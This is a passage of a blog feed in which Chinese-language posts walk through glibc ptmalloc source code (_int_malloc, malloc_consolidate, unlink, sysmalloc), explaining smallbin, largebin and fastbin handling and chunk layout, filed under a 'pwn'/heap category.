class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">static void * _int_malloc(mstate av, size_t bytes) &#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    if (in_smallbin_range(nb)) &#123;</div><div class="line">        idx = smallbin_index(nb);</div><div class="line">        bin = bin_at (av, idx);</div><div class="line"></div><div class="line">        if ((victim = last(bin)) != bin) &#123;</div><div class="line">            if (victim == 0)</div><div class="line">                malloc_consolidate(av);</div><div class="line">            else &#123;</div><div class="line">                bck = victim-&gt;bk;</div><div class="line">                if (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</div><div class="line">                    errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</div><div class="line">                    goto errout;</div><div class="line">                &#125;</div><div class="line">                set_inuse_bit_at_offset(victim, nb);</div><div class="line">                bin-&gt;bk = bck;</div><div class="line">                bck-&gt;fd = bin;</div><div class="line"></div><div class="line">                if (av != &amp;main_arena)</div><div class="line">                    victim-&gt;size |= NON_MAIN_ARENA;</div><div class="line">                check_malloced_chunk (av, victim, nb);</div><div class="line">                void *p = chunk2mem(victim);</div><div class="line">                alloc_perturb(p, bytes);</div><div class="line">                return p;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;else &#123;</div><div class="line">        idx = largebin_index(nb);</div><div class="line">        if (have_fastchunks(av))</div><div class="line">            malloc_consolidate(av);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>首先</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#define in_smallbin_range(sz)  \</div><div class="line">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</div></pre></td></tr></table></figure>
<p>基于本章假设，<code>MIN_LARGE_SIZE</code>经过换算后为512字节，因此低于512字节大小的内存块都归smallbin管理。<br>接下来通过<code>bin_at</code>获得smallbin空闲chunk链表指针，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">#define bin_at(m, i) \</div><div class="line">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))               \</div><div class="line">             - offsetof (struct malloc_chunk, fd))</div></pre></td></tr></table></figure>
<p>这里乘2，并且减去fd相对于<code>malloc_chunk</code>中的位置是因为smallbin中存储的是fd和bk指针。<br><code>last</code>定义为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#define last(b)      ((b)-&gt;bk)</div></pre></td></tr></table></figure>
<p>该函数获得chunk的前一个chunk，由因为该chunk是smallbin的链表头，因此获得的是最后一个chunk，如果两者相等，表示对应的链表为空，什么都不做。<br>这里假设不相等，接下来有两种情况，第一种是<code>victim=0</code>，表示smallbin还没有初始化，这里需要特别说明一下这里。smallbin初始化为<code>malloc_chunk</code>指针数组，虽然定义为指针数组，但实际上存储的是fd和bk指针，如下所示<br>|fd|bk|fd|bk|…|fd|bk|<br>当smallbin还未初始化时，假设<code>idx=1</code>，根据<code>bin_at</code>取出的<code>bin</code>是一个虚拟的<code>malloc_chunk</code>指针，<code>bin-&gt;fd</code>，是第二个fd，因此<code>bin-&gt;bk</code>就是对应的bk，其值为0（bin-&gt;bk取出的不是地址，而是值）。因此当<code>victim</code>为0时，可以断定smallbin未初始化，此时调用<code>malloc_consolidate</code>进行初始化，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">static void malloc_consolidate(mstate av) &#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    if (get_max_fast () != 0) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125; else &#123;</div><div class="line">        malloc_init_state(av);</div><div class="line">        check_malloc_state(av);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>省略代码的if语句里是将fastbin中的chunk进行合并，然后添加到bins中，这里不分析，因为还未初始化，因此<code>get_max_fast</code>返回0，后面的章节碰到了再分析。进入else部分，<code>check_malloc_state</code>为空函数，<code>malloc_init_state</code>就是主要的初始化函数，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">static void malloc_init_state(mstate av) &#123;</div><div class="line">    int i;</div><div class="line">    mbinptr bin;</div><div class="line"></div><div class="line">    for (i = 1; i &lt; NBINS; ++i) &#123;</div><div class="line">        bin = bin_at (av, i);</div><div class="line">        bin-&gt;fd = bin-&gt;bk = bin;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">#if MORECORE_CONTIGUOUS</div><div class="line">    if (av != &amp;main_arena)</div><div class="line">#endif</div><div class="line">        set_noncontiguous(av);</div><div class="line">    if (av == &amp;main_arena)</div><div class="line">        set_max_fast(DEFAULT_MXFAST);</div><div class="line">    av-&gt;flags |= FASTCHUNKS_BIT;</div><div class="line"></div><div class="line">    av-&gt;top = initial_top (av);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>该函数做了四件事情，第一是初始化<code>malloc_state</code>中的<code>bins</code>数组，初始化的结果是对<code>bins</code>数组中的每一个<code>fd</code>和对应的<code>bk</code>，都初始化为<code>fd</code>的地址，即<code>fd=bk=&amp;fd</code>；第二是设置fastbin可管理的内存块的最大值，即<code>global_max_fast</code>，<code>DEFAULT_MXFAST</code>定义为，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#define DEFAULT_MXFAST     (64 * SIZE_SZ / 4)</div></pre></td></tr></table></figure>
<p>本章假设为64，<code>set_max_fast</code>定义为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">#define set_max_fast(s) \</div><div class="line">  global_max_fast = (((s) == 0)                           \</div><div class="line">                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</div></pre></td></tr></table></figure>
<p>第三是设置一些标志位；第四是初始化分配去中的top chunk，就是一个<code>malloc_chunk</code>指针，<code>fd</code>保存在<code>bins[0]</code>中（smallbin中不使用<code>bins[0]</code>和<code>bins[1]</code>）。<br>重新回到<code>_int_malloc</code>中，假设<code>victim</code>不为0，下面就从双向链表中取出<code>victim</code>，设置其中的标志位，然后返回用户可分配的内存指针。<br>假设smallbin中没有空闲chunk可用，下面就要开始寻找largebin了，<code>largebin_index</code>定义为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#define largebin_index(sz) \</div><div class="line">  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \</div><div class="line">   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \</div><div class="line">   : largebin_index_32 (sz))</div></pre></td></tr></table></figure>
<p>根据前面<code>SIZE_SZ</code>的假设，这里<code>largebin_index</code>对应的就是<code>largebin_index_32</code>，定义为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#define largebin_index_32(sz)                                                \</div><div class="line">  (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 38) ?  56 + (((unsigned long) (sz)) &gt;&gt; 6) :\</div><div class="line">   ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;&gt; 9) :\</div><div class="line">   ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;&gt; 12) :\</div><div class="line">   ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;&gt; 15) :\</div><div class="line">   ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;&gt; 18) :\</div><div class="line">   126)</div></pre></td></tr></table></figure>
<p>这里就不多解释了，如果需要知道sz和索引的对应关系，可以自己计算一下。<br>再接下来<code>have_fastchunks</code>根据标志位判断fastbin中是否有空闲chunk，如果有，就调用<code>malloc_consolidate</code>将这些chunk和并，然后加入到unsortedbin中。</p>
<h1 id="int-malloc-—-合并fastbin"><a href="#int-malloc-—-合并fastbin" class="headerlink" title="_int_malloc — 合并fastbin"></a>_int_malloc — 合并fastbin</h1><p>下面重新看一下<code>malloc_consolidate</code>函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div></pre></td><td class="code"><pre><div class="line">static void malloc_consolidate(mstate av) &#123;</div><div class="line">    mfastbinptr* fb;</div><div class="line">    mfastbinptr* maxfb;</div><div class="line">    mchunkptr p;</div><div class="line">    mchunkptr nextp;</div><div class="line">    mchunkptr unsorted_bin;</div><div class="line">    mchunkptr first_unsorted;</div><div class="line"></div><div class="line">    mchunkptr nextchunk;</div><div class="line">    INTERNAL_SIZE_T size;</div><div class="line">    INTERNAL_SIZE_T nextsize;</div><div class="line">    INTERNAL_SIZE_T prevsize;</div><div class="line">    int nextinuse;</div><div class="line">    mchunkptr bck;</div><div class="line">    mchunkptr fwd;</div><div class="line"></div><div class="line">    if (get_max_fast () != 0) &#123;</div><div class="line">        clear_fastchunks(av);</div><div class="line">        unsorted_bin = unsorted_chunks(av);</div><div class="line"></div><div class="line">        maxfb = &amp;fastbin(av, NFASTBINS - 1);</div><div class="line">        fb = &amp;fastbin(av, 0);</div><div class="line">        do &#123;</div><div class="line">            p = atomic_exchange_acq(fb, 0);</div><div class="line">            if (p != 0) &#123;</div><div class="line">                do &#123;</div><div class="line">                    check_inuse_chunk(av, p);</div><div class="line">                    nextp = p-&gt;fd;</div><div class="line"></div><div class="line">                    size = p-&gt;size &amp; ~(PREV_INUSE | NON_MAIN_ARENA);</div><div class="line">                    nextchunk = chunk_at_offset(p, size);</div><div class="line">                    nextsize = chunksize(nextchunk);</div><div class="line"></div><div class="line">                    if (!prev_inuse(p)) &#123;</div><div class="line">                        prevsize = p-&gt;prev_size;</div><div class="line">                        size += prevsize;</div><div class="line">                        p = chunk_at_offset(p, -((long ) prevsize));</div><div class="line">                        unlink(av, p, bck, fwd);</div><div class="line">                    &#125;</div><div class="line"></div><div class="line">                    if (nextchunk != av-&gt;top) &#123;</div><div class="line">                        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</div><div class="line"></div><div class="line">                        if (!nextinuse) &#123;</div><div class="line">                            size += nextsize;</div><div class="line">                            unlink(av, nextchunk, bck, fwd);</div><div class="line">                        &#125; else</div><div class="line">                            clear_inuse_bit_at_offset(nextchunk, 0);</div><div class="line"></div><div class="line">                        first_unsorted = unsorted_bin-&gt;fd;</div><div class="line">                        unsorted_bin-&gt;fd = p;</div><div class="line">                        first_unsorted-&gt;bk = p;</div><div class="line"></div><div class="line">                        if (!in_smallbin_range(size)) &#123;</div><div class="line">                            p-&gt;fd_nextsize = NULL;</div><div class="line">                            p-&gt;bk_nextsize = NULL;</div><div class="line">                        &#125;</div><div class="line"></div><div class="line">                        set_head(p, size | PREV_INUSE);</div><div class="line">                        p-&gt;bk = unsorted_bin;</div><div class="line">                        p-&gt;fd = first_unsorted;</div><div class="line">                        set_foot(p, size);</div><div class="line">                    &#125;</div><div class="line"></div><div class="line">                    else &#123;</div><div class="line">                        size += nextsize;</div><div class="line">                        set_head(p, size | PREV_INUSE);</div><div class="line">                        av-&gt;top = p;</div><div class="line">                    &#125;</div><div class="line"></div><div class="line">                &#125; while ((p = nextp) != 0);</div><div class="line"></div><div class="line">            &#125;</div><div class="line">        &#125; while (fb++ != maxfb);</div><div class="line">    &#125; else &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>因为ptmalloc前面已经初始化过了，这里直接进入if内部，首先通过<code>clear_fastchunks</code>设置标志位表示fastbin中存在空闲chunk，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#define clear_fastchunks(M)    catomic_or (&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</div></pre></td></tr></table></figure>
<p>然后通过<code>unsorted_chunks</code>获得bins数组中unsortedbin对应的<code>malloc_chunk</code>指针（其<code>fd</code>和<code>bk</code>指针对应<code>bins[0]</code>和<code>bins[1]</code>）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#define unsorted_chunks(M)          (bin_at (M, 1))</div></pre></td></tr></table></figure>
<p>再往下，将fastbin中的最大和最小的chunk对应的<code>malloc_chunk</code>指针赋值给<code>maxfb</code>和<code>fb</code>，然后通过do，while循环遍历fastbin中的每个chunk链表，<code>atomic_exchange_acq</code>又是一个CAS操作，该函数取出<code>fb</code>指针，并将原来的chunk链表头指针的值设为0，表示chunk链表空闲了。然后开始进入内层的循环，这里遍历的是每个chunk链表中的每个<code>malloc_chunk</code>指针。<br>接下来首先去除chunk中的<code>PREV_INUSE</code>和<code>NON_MAIN_ARENA</code>标志，为了获得chunk的大小（size中的最低三位被用来作为标志位，并且fastbin中chunk的标志位<code>IS_MMAPPED</code>默认为0）。然后通过<code>chunk_at_offset</code>和<code>chunksize</code>获得下一个chunk以及其大小，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</div><div class="line">#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</div><div class="line">#define chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))</div></pre></td></tr></table></figure>
<p>再往下，如果chunk的前一个chunk没在使用中，就合并该chunk与前一个chunk，主要是重新计算<code>malloc_chunk</code>的指针，并调用<code>unlink</code>将前一个chunk从bins数组中删除，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">#define unlink(AV, P, BK, FD) &#123;                                            \</div><div class="line">    FD = P-&gt;fd;                                   \</div><div class="line">    BK = P-&gt;bk;                                   \</div><div class="line">    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))             \</div><div class="line">      malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</div><div class="line">    else &#123;                                    \</div><div class="line">        FD-&gt;bk = BK;                                  \</div><div class="line">        BK-&gt;fd = FD;                                  \</div><div class="line">        if (!in_smallbin_range (P-&gt;size)                      \</div><div class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;            \</div><div class="line">        if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)        \</div><div class="line">        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</div><div class="line">          malloc_printerr (check_action,                      \</div><div class="line">                   &quot;corrupted double-linked list (not small)&quot;,    \</div><div class="line">                   P, AV);                        \</div><div class="line">            if (FD-&gt;fd_nextsize == NULL) &#123;                    \</div><div class="line">                if (P-&gt;fd_nextsize == P)                      \</div><div class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;             \</div><div class="line">                else &#123;                                \</div><div class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                 \</div><div class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                 \</div><div class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                 \</div><div class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                 \</div><div class="line">                  &#125;                               \</div><div class="line">              &#125; else &#123;                                \</div><div class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;             \</div><div class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;             \</div><div class="line">              &#125;                                   \</div><div class="line">          &#125;                                   \</div><div class="line">      &#125;                                       \</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>简单来说，该宏定义就是将前一个chunk从两个双线链表中删除，<code>fd</code>和<code>bk</code>指针构成的双向链表存在于smallbin和largebin中，<code>fd_nextsize</code>和<code>bk_nextsize</code>指针构成的双向链表只存在于largebin中。<br>再往下，如果相邻的下一个chunk不是top chunk，并且下一个chunk不在使用中，就继续合并，否则，就清除下一个chunk的<code>PREV_INUSE</code>，表示该chunk已经空闲了。<br>然后将刚刚合并完的chunk添加进<code>unsorted_bin</code>中，<code>unsorted_bin</code>也是一个双向链表。<br>如果合并完的chunk属于smallbin的大小，则需要清除<code>fd_nextsize</code>和<code>bk_nextsize</code>，因为smallbin中的chunk不会使用这两个指针。并且通过<code>setHead</code>保证不会有相邻的两个chunk都空闲，并且通过<code>setFoot</code>设置下一个chunk的<code>prev_size</code>。<br>如果相邻的下一个chunk是top chunk，则将合并完的chunk继续合并到top chunk中。<br>至此，<code>malloc_consolidate</code>就分析完了，总结一下，<code>malloc_consolidate</code>就是遍历fastbin中每个chunk链表的每个<code>malloc_chunk</code>指针，合并前一个不在使用中的chunk，如果后一个chunk是top chunk，则直接合并到top chunk中，如果后一个chunk不是top chunk，则合并后一个chunk并添加进<code>unsorted_bin</code>中。</p>
<p>下一章继续往下分析_int_malloc函数。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;malloc源码分析—-int-malloc&quot;&gt;&lt;a href=&quot;#malloc源码分析—-int-malloc&quot; class=&quot;headerlink&quot; title=&quot;malloc源码分析—_int_malloc&quot;&gt;&lt;/a&gt;malloc源码分析—_int_mall
    
    </summary>
    
      <category term="pwn" scheme="http://yoursite.com/categories/pwn/"/>
    
    
      <category term="heap" scheme="http://yoursite.com/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>malloc源码分析——2</title>
    <link href="http://yoursite.com/2018/05/21/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94%E2%80%942/"/>
    <id>http://yoursite.com/2018/05/21/malloc源码分析——2/</id>
    <published>2018-05-21T06:39:08.000Z</published>
    <updated>2018-05-21T06:50:32.140Z</updated>
    
    <content type="html"><![CDATA[<h1 id="malloc源码分析—-int-malloc"><a href="#malloc源码分析—-int-malloc" class="headerlink" title="malloc源码分析—_int_malloc"></a>malloc源码分析—_int_malloc</h1><p>根据上一章的分析，malloc会调用<code>__libc_malloc</code>分配内存，<code>__libc_malloc</code>会调用<code>malloc_hook_ini</code> 进行初始化，然后回调<code>__libc_malloc</code>函数，这时候会执行<code>_int_malloc</code>开始分配内存，定义在malloc.c中，因为非常长，这里分段来看，</p>
<h2 id="int-malloc第一部分"><a href="#int-malloc第一部分" class="headerlink" title="_int_malloc第一部分"></a>_int_malloc第一部分</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">static void * _int_malloc(mstate av, size_t bytes) &#123;</div><div class="line">    INTERNAL_SIZE_T nb;</div><div class="line">    unsigned int idx;</div><div class="line">    mbinptr bin;</div><div class="line"></div><div class="line">    mchunkptr victim;</div><div class="line">    INTERNAL_SIZE_T size;</div><div class="line">    int victim_index;</div><div class="line"></div><div class="line">    mchunkptr remainder;</div><div class="line">    unsigned long remainder_size;</div><div class="line"></div><div class="line">    unsigned int block;</div><div class="line">    unsigned int bit;</div><div class="line">    unsigned int map;</div><div class="line"></div><div class="line">    mchunkptr fwd;</div><div class="line">    mchunkptr bck;</div><div class="line"></div><div class="line">    const char *errstr = NULL;</div><div class="line"></div><div class="line">    checked_request2size(bytes, nb);</div><div class="line"></div><div class="line">    if (__glibc_unlikely(av == NULL)) &#123;</div><div class="line">        void *p = sysmalloc(nb, av);</div><div class="line">        if (p != NULL)</div><div class="line">            alloc_perturb(p, bytes);</div><div class="line">        return p;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div></pre></td></tr></table></figure>
<p>首先调用<code>checked_request2size</code>将需要分配的内存大小bytes转换为chunk的大小。<code>checked_request2size</code>是个宏定义，主要调用request2size进行计算，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#define request2size(req)                                         \</div><div class="line">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</div><div class="line">   MINSIZE :                                                      \</div><div class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</div></pre></td></tr></table></figure>
<p>为了说明request2size，首先看一下ptmalloc中关于chunk的定义，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">struct malloc_chunk &#123;</div><div class="line"></div><div class="line">    INTERNAL_SIZE_T prev_size;</div><div class="line">    INTERNAL_SIZE_T size;</div><div class="line"></div><div class="line">    struct malloc_chunk* fd; </div><div class="line">    struct malloc_chunk* bk;</div><div class="line"></div><div class="line">    struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */</div><div class="line">    struct malloc_chunk* bk_nextsize;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>当一个chunk为空闲时，至少要有<code>prev_size</code>、<code>size</code>、<code>fd</code>和<code>bk</code>四个参数，因此MINSIZE就代表了这四个参数需要占用的内存大小；而当一个chunk被使用时，<code>prev_size</code>可能会被前一个chunk用来存储，<code>fd</code>和<code>bk</code>也会被当作内存存储数据，因此当chunk被使用时，只剩下了<code>size</code>参数需要设置，<code>request2size</code>中的<code>SIZE_SZ</code>就是<code>INTERNAL_SIZE_T</code>类型的大小，因此至少需要<code>req+SIZE_SZ</code>的内存大小。<code>MALLOC_ALIGN_MASK</code>用来对齐，因此request2size就计算出了所需的chunk的大小。</p>
<p>传入的参数av是在上一章<code>__libc_malloc</code>中调用<code>arena_get</code>获得的分配去指针，如果为null，就表示没有分配区可用，这时候就直接调用<code>sysmalloc</code>通过mmap获取chunk。</p>
<h2 id="sysmalloc"><a href="#sysmalloc" class="headerlink" title="sysmalloc"></a>sysmalloc</h2><p><code>sysmalloc</code>的代码很长，但只有前面一小部分是这里需要分析的，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div></pre></td><td class="code"><pre><div class="line">static void * sysmalloc(INTERNAL_SIZE_T nb, mstate av) &#123;</div><div class="line">    mchunkptr old_top;</div><div class="line">    INTERNAL_SIZE_T old_size;</div><div class="line">    char *old_end;</div><div class="line"></div><div class="line">    long size;</div><div class="line">    char *brk;</div><div class="line"></div><div class="line">    long correction;</div><div class="line">    char *snd_brk;</div><div class="line"></div><div class="line">    INTERNAL_SIZE_T front_misalign;</div><div class="line">    INTERNAL_SIZE_T end_misalign;</div><div class="line">    char *aligned_brk;</div><div class="line"></div><div class="line">    mchunkptr p;</div><div class="line">    mchunkptr remainder;</div><div class="line">    unsigned long remainder_size;</div><div class="line"></div><div class="line">    size_t pagesize = GLRO(dl_pagesize);</div><div class="line">    bool tried_mmap = false;</div><div class="line"></div><div class="line">    if (av == NULL</div><div class="line">            || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold)</div><div class="line">                    &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))) &#123;</div><div class="line">        char *mm;</div><div class="line"></div><div class="line">        try_mmap:</div><div class="line">        if (MALLOC_ALIGNMENT == 2 * SIZE_SZ)</div><div class="line">            size = ALIGN_UP(nb + SIZE_SZ, pagesize);</div><div class="line">        else</div><div class="line">            size = ALIGN_UP(nb + SIZE_SZ + MALLOC_ALIGN_MASK, pagesize);</div><div class="line">        tried_mmap = true;</div><div class="line"></div><div class="line">        if ((unsigned long) (size) &gt; (unsigned long) (nb)) &#123;</div><div class="line">            mm = (char *) (MMAP(0, size, PROT_READ | PROT_WRITE, 0));</div><div class="line"></div><div class="line">            if (mm != MAP_FAILED) &#123;</div><div class="line"></div><div class="line">                if (MALLOC_ALIGNMENT == 2 * SIZE_SZ) &#123;</div><div class="line">                    assert(</div><div class="line">                            ((INTERNAL_SIZE_T) chunk2mem (mm) &amp; MALLOC_ALIGN_MASK) == 0);</div><div class="line">                    front_misalign = 0;</div><div class="line">                &#125; else</div><div class="line">                    front_misalign = (INTERNAL_SIZE_T) chunk2mem(</div><div class="line">                            mm) &amp; MALLOC_ALIGN_MASK;</div><div class="line">                if (front_misalign &gt; 0) &#123;</div><div class="line">                    correction = MALLOC_ALIGNMENT - front_misalign;</div><div class="line">                    p = (mchunkptr) (mm + correction);</div><div class="line">                    p-&gt;prev_size = correction;</div><div class="line">                    set_head(p, (size - correction) | IS_MMAPPED);</div><div class="line">                &#125; else &#123;</div><div class="line">                    p = (mchunkptr) mm;</div><div class="line">                    set_head(p, size | IS_MMAPPED);</div><div class="line">                